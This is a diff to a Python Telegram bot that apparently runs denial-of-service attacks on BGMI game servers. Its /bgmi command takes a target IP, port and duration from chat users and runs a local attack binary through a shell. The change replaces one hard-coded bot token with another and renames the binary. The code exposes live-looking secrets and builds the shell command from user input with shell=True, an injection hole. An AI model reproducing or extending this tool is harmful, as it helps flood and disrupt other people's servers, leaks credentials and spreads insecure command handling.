@@ -7,7 +7,7 @@ import string
 import json
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7780710298:AAEjaK5f-OfVCVwiopsUqYll6GgW0j9Mt1k')
+bot = telebot.TeleBot('7725009934:AAF88uHD9YxpEPdTPEF90oB-mQs66_8P9Ow')
 # Admin user IDs
 admin_id = {'1821595166' ,'1821595166'}
 
@@ -189,7 +189,7 @@ def handle_bgmi(message):
                     record_command_logs(user_id, '/bgmi', target, port, time)
                     log_command(user_id, target, port, time)
                     start_attack_reply(message, target, port, time)
-                    full_command = f"./ipx {target} {port} {time}"
+                    full_command = f"./bgmi {target} {port} {time}"
                     subprocess.run(full_command, shell=True)
                     response = f"𝐂𝐇𝐔𝐃𝐀𝐈 𝐅𝐢𝐧𝐢𝐬𝐡𝐞𝐝🎮\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬"
             except ValueError:
